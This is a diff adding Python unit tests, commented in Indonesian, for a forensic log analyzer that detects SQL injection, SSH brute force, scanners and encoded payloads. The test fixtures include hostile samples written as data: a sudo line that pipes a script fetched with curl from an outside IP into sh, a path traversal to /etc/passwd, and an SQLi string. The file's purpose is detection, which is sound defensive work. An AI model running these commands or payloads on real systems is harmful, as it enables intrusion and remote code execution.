@@ -1005,6 +1005,242 @@ def test_capinfos_float_survives_comma_decimal_locale():
     assert _int("51181") == 51181 and _int("51,181") == 51181
 
 
+# ---------- Analisis log ----------
+
+def _log(text: str, name: str = "access.log"):
+    """Tulis log ke berkas sementara dan kembalikan hasil analisisnya."""
+    from backend.services import log_analyzer
+    tmp = Path(tempfile.mkdtemp()) / name
+    tmp.write_text(text, encoding="utf-8")
+    return log_analyzer.analyze(tmp), tmp
+
+
+def test_log_month_name_parsed_without_locale():
+    """
+    strptime("%b") mengikuti locale sistem: di Windows berbahasa Indonesia ia
+    menolak "Oct" dan menuntut "Okt". Kalau dipakai, SETIAP timestamp jadi None
+    dan seluruh timeline hilang tanpa satu pun pesan error -- persis bug capinfos.
+    """
+    from backend.services.log_analyzer import _apache_time
+    assert _apache_time("10/Oct/2000:13:55:36 +0000") == 971186136.0
+    assert _apache_time("10/Okt/2000:13:55:36 +0000") is None   # bukan nama bulan valid
+
+
+def test_log_apache_timezone_offset_applied():
+    """
+    Log ditulis dalam waktu LOKAL server. Tanpa koreksi offset, timeline log dan
+    timeline pcap (selalu UTC) bergeser sejauh offset -- dan korelasi antar
+    keduanya salah tanpa terlihat salah.
+    """
+    from backend.services.log_analyzer import _apache_time
+    utc = _apache_time("10/Oct/2000:13:55:36 +0000")
+    assert _apache_time("10/Oct/2000:20:55:36 +0700") == utc
+    assert _apache_time("10/Oct/2000:06:55:36 -0700") == utc
+
+
+def test_log_iis_plus_encoded_space_still_matches_sqli():
+    """
+    IIS meng-encode spasi sebagai '+'. Dengan unquote biasa (bukan unquote_plus),
+    "1'+OR+'1'='1" tidak cocok dengan satu pun pola SQLi -- semuanya menuntut
+    spasi. Setiap SQLi di log IIS lolos tanpa tanda apa pun bahwa ada yang terlewat.
+    """
+    log = ("#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port "
+           "cs-username c-ip cs(User-Agent) sc-status sc-bytes\n"
+           "2026-08-14 03:00:09 10.0.0.5 GET /search.aspx "
+           "q=1'+OR+'1'='1 80 - 198.51.100.99 sqlmap/1.7.2 500 512\n")
+    result, _ = _log(log, "u_ex260814.log")
+    assert result["summary"]["format"] == "iis_w3c"
+    assert any("SQLi" in a["owasp_category"] for a in result["web_attacks"]), \
+        "SQLi ter-encode '+' tidak terdeteksi"
+
+
+def test_log_iis_rereads_fields_header_when_columns_change():
+    """
+    IIS menulis ulang #Fields tiap restart, dan urutan kolomnya boleh berubah.
+    Membaca header pertama saja membuat baris setelah restart salah kolom --
+    c-ip terbaca sebagai status, dan penyerangnya jadi salah orang.
+    """
+    log = ("#Fields: date time c-ip cs-method cs-uri-stem sc-status\n"
+           "2026-08-14 03:00:01 203.0.113.1 GET /a 200\n"
+           "#Fields: date time cs-method cs-uri-stem c-ip sc-status\n"
+           "2026-08-14 03:00:02 GET /b 203.0.113.2 404\n")
+    result, _ = _log(log, "u_ex.log")
+    sources = {row["src_ip"] for row in result["top_sources"]}
+    assert sources == {"203.0.113.1", "203.0.113.2"}, sources
+
+
+def test_log_comment_lines_not_counted_as_unparsed():
+    """
+    Header '#' bukan baris log. Kalau ikut dihitung, berkas IIS berisi 3 request
+    melapor '3 dari 7 baris terbaca' dan terlihat seperti parser yang gagal.
+    """
+    log = ("#Software: IIS 10.0\n#Version: 1.0\n#Date: 2026-08-14 03:00:00\n"
+           "#Fields: date time c-ip cs-method cs-uri-stem sc-status\n"
+           "2026-08-14 03:00:01 203.0.113.1 GET /a 200\n")
+    result, _ = _log(log, "u_ex.log")
+    assert result["summary"]["lines_total"] == 1
+    assert result["summary"]["parse_rate"] == 1.0
+
+
+def test_log_success_before_failures_is_not_a_breach():
+    """
+    Login sah pagi hari lalu brute force sore hari BUKAN 'kredensial berhasil
+    ditebak'. Sukses hanya dihitung kalau terjadi setelah kegagalan pertama.
+    """
+    lines = ["Aug 14 01:00:00 web01 sshd[1]: Accepted password for deploy "
+             "from 45.9.74.32 port 22 ssh2"]
+    lines += [f"Aug 14 03:0{i // 10}:{i % 10:02d} web01 sshd[{i}]: Failed password "
+              f"for root from 45.9.74.32 port 51{i} ssh2" for i in range(12)]
+    result, _ = _log("\n".join(lines) + "\n", "auth.log")
+    brute = result["brute_force"]
+    assert len(brute) == 1 and brute[0]["failures"] == 12
+    assert brute[0]["compromised"] is False, "sukses SEBELUM brute force dihitung jebol"
+
+
+def test_log_success_after_failures_is_a_breach():
+    lines = [f"Aug 14 03:00:{i:02d} web01 sshd[{i}]: Failed password for root "
+             f"from 45.9.74.32 port 51{i} ssh2" for i in range(12)]
+    lines.append("Aug 14 03:05:00 web01 sshd[99]: Accepted password for deploy "
+                 "from 45.9.74.32 port 22 ssh2")
+    result, _ = _log("\n".join(lines) + "\n", "auth.log")
+    assert result["brute_force"][0]["compromised"] is True
+    assert result["brute_force"][0]["compromised_accounts"] == ["deploy"]
+
+
+def test_log_sudo_after_breach_is_high_confidence():
+    """Yang menentukan tingkat kerusakan bukan 'siapa masuk', tapi apa yang dikerjakannya."""
+    lines = [f"Aug 14 03:00:{i:02d} web01 sshd[{i}]: Failed password for root "
+             f"from 45.9.74.32 port 51{i} ssh2" for i in range(12)]
+    lines.append("Aug 14 03:05:00 web01 sshd[99]: Accepted password for deploy "
+                 "from 45.9.74.32 port 22 ssh2")
+    lines.append("Aug 14 03:06:00 web01 sudo:   deploy : TTY=pts/0 ; USER=root ; "
+                 "COMMAND=/bin/bash -c curl http://45.9.74.32:8888/x.sh | sh")
+    result, _ = _log("\n".join(lines) + "\n", "auth.log")
+    sudo = result["privilege_use"]
+    assert len(sudo) == 1 and sudo[0]["confidence"] == "HIGH"
+    assert sudo[0]["after_breach"] and sudo[0]["reasons"]
+
+
+def test_log_multiple_tools_from_one_ip_all_reported():
+    """
+    Satu penyerang lazim memakai beberapa alat berurutan. Melaporkan User-Agent
+    terbanyak saja menampilkan 'Nikto' dan menyembunyikan sqlmap yang dipakai
+    sesudahnya -- justru temuan yang lebih berat.
+    """
+    lines = [f'198.51.100.7 - - [14/Aug/2026:03:20:{i:02d} +0000] "GET /g{i} HTTP/1.1" '
+             f'404 209 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"' for i in range(25)]
+    lines.append('198.51.100.7 - - [14/Aug/2026:03:21:00 +0000] "GET /x HTTP/1.1" '
+                 '200 11 "-" "sqlmap/1.7.2#stable"')
+    result, _ = _log("\n".join(lines) + "\n")
+    tools = {t["tool"] for t in result["scanners"][0]["tools"]}
+    assert tools == {"Nikto", "sqlmap"}, tools
+
+
+def test_log_evidence_query_uses_fixed_string_grep():
+    """
+    URI serangan penuh karakter bermakna di regex. Tanpa -F, perintah yang kita
+    cetak sebagai bukti bisa tidak menemukan barisnya sendiri.
+    """
+    log = ('198.51.100.7 - - [14/Aug/2026:03:20:09 +0000] '
+           '"GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841 "-" "curl/8.1.2"\n')
+    result, _ = _log(log)
+    query = result["web_attacks"][0]["evidence_query"]
+    assert query.startswith("grep -nF "), query
+
+
+def test_log_unreadable_format_reports_parse_rate():
+    """
+    '0 temuan' dari log yang formatnya tidak dikenali terlihat persis sama dengan
+    '0 temuan' dari log yang memang bersih. Angka keterbacaannya wajib muncul.
+    """
+    from backend.services import log_analyzer
+    from backend.services.timeline_builder import EvidenceLog
+    tmp = Path(tempfile.mkdtemp()) / "aneh.log"
+    tmp.write_text("baris acak yang bukan log\n" * 40, encoding="utf-8")
+    evidence = EvidenceLog()
+    result = log_analyzer.analyze(tmp, evidence)
+    assert result["summary"]["parse_rate"] < 0.5
+    assert any(r["finding_type"] == "log_parse_incomplete" for r in evidence.records)
+    assert any("tidak meliputi seluruh" in gap for gap in result["timeline"]["unresolved"])
+
+
+def test_log_base64_parameter_is_decoded():
+    """
+    Muatan ter-encode di query string adalah cara paling murah menyelundupkan
+    perintah lewat log yang dipantau: yang tercatat hanya deretan huruf tanpa
+    arti. Tanpa dekode, seluruh baris terlihat seperti 404 biasa.
+    """
+    log = ('10.0.0.55 - - [11/Aug/2026:10:25:31 +0700] "GET /hidden_endpoint?'
+           'payload=YjRzMWNfYjRzNjRfM25jMGQxbmdfZjByX3Rt HTTP/1.1" 404 128\n')
+    result, _ = _log(log)
+    found = result["encoded_parameters"]
+    assert len(found) == 1, found
+    assert found[0]["decoded"] == "b4s1c_b4s64_3nc0d1ng_f0r_tm"
+    assert found[0]["parameter"] == "payload"
+
+
+def test_log_random_token_is_not_reported_as_encoded_payload():
+    """
+    Token sesi dan hash juga base64. Bedanya, yang itu terdekode jadi byte acak,
+    bukan kalimat -- melaporkannya membuat tiap request ber-sesi jadi temuan.
+    """
+    import base64 as b64
+    token = b64.b64encode(bytes(range(32))).decode()
+    log = (f'192.168.1.10 - - [11/Aug/2026:10:00:01 +0700] "GET /a?sid={token} '
+           f'HTTP/1.1" 200 10\n')
+    result, _ = _log(log)
+    assert result["encoded_parameters"] == []
+
+
+def test_log_small_response_is_not_data_movement():
+    """
+    Di log berisi 6 baris, logo.png 4 KB menguasai 53% seluruh byte dan naik jadi
+    temuan 'data keluar' -- padahal itu logo. Porsi saja tidak cukup; batas
+    absolut harus ikut terpenuhi.
+    """
+    log = ('192.168.1.10 - - [11/Aug/2026:10:00:01 +0700] "GET /a HTTP/1.1" 200 100\n'
+           '192.168.1.10 - - [11/Aug/2026:10:30:00 +0700] "GET /images/logo.png '
+           'HTTP/1.1" 200 4096\n')
+    result, _ = _log(log)
+    assert result["large_transfers"][0]["share_of_total"] > 0.9   # tetap didaftarkan
+    assert not any(t["is_notable"] for t in result["large_transfers"])
+    assert not any(e["phase"] == "Data Movement" for e in result["timeline"]["events"])
+
+
+def test_log_large_response_still_flagged():
+    """Batas absolut tidak boleh mematikan deteksinya untuk berkas yang memang besar."""
+    log = ('192.168.1.10 - - [11/Aug/2026:10:00:01 +0700] "GET /a HTTP/1.1" 200 100\n'
+           '203.0.113.9 - - [11/Aug/2026:10:30:00 +0700] "GET /backup/db.sql '
+           'HTTP/1.1" 200 918273645\n')
+    result, _ = _log(log)
+    assert any(t["is_notable"] for t in result["large_transfers"])
+    assert any(e["phase"] == "Data Movement" for e in result["timeline"]["events"])
+
+
+def test_log_syslog_year_assumption_is_declared():
+    """Format syslog tidak memuat tahun. Asumsinya dicatat, bukan disembunyikan."""
+    result, _ = _log("Aug 14 03:12:44 web01 sshd[1]: Invalid user admin "
+                     "from 45.9.74.32 port 51122\n", "auth.log")
+    assert result["summary"]["assumed_year"]
+    assert any("tahun" in gap for gap in result["timeline"]["unresolved"])
+
+
+def test_log_category_detected_from_content_not_only_extension():
+    """`/var/log/secure` tidak punya ekstensi sama sekali."""
+    from backend.analyze_file import categorize
+    tmp = Path(tempfile.mkdtemp()) / "secure"
+    tmp.write_text("Aug 14 03:12:44 web01 sshd[1]: Failed password for root "
+                   "from 45.9.74.32 port 22 ssh2\n" * 5, encoding="utf-8")
+    assert categorize(tmp, "text/plain") == "log"
+
+
+def test_log_rotated_gzip_name_recognised():
+    """Log yang dirotasi bernama access.log.3.gz -- mencocokkan suffix saja meleset."""
+    from backend.analyze_file import categorize
+    assert categorize(Path("access.log.3.gz"), "application/gzip") == "log"
+    assert categorize(Path("u_ex260814.log"), "text/plain") == "log"
+
+
 if __name__ == "__main__":
     tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
     failed = 0
